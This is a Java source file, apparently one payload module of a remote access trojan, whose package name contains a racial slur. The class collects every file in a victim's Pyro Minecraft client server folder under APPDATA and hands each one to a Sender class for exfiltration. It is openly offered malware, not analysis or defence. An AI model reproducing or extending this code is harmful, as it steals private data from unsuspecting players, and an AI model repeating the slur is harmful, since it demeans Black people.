package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.Payload;
import me.nigger.rat.payload.Sender;
import me.nigger.rat.util.FileUtil;

import java.io.File;

public final class PyroWaypoints implements Payload
{
    @Override
    public void execute() throws Exception
    {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server"))
        {
            Sender.send(file);
        }
    }
}
